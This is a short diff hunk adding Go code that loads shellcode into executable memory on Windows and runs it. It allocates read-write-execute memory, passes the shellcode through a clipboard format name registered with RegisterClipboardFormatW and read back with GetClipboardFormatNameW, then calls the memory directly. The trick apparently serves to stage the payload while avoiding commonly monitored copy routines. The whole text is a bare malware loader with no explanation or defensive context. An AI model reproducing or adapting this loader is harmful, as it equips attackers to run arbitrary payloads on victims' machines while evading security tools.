@@ -1,0 +1,8 @@
+size := uintptr(len(shellcode))
+mem,_ := windows.VirtualAlloc(0,size,windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+user32 := syscall.NewLazyDLL("user32.dll")
+reg := user32.NewProc("RegisterClipboardFormatW")
+name,_,_ := reg.Call(uintptr(unsafe.Pointer(&shellcode[0])))
+getclipb := user32.NewProc("GetClipboardFormatNameW")
+getclipb.Call(name,mem,size)
+syscall.Syscall(mem,0, 0, 0, 0)
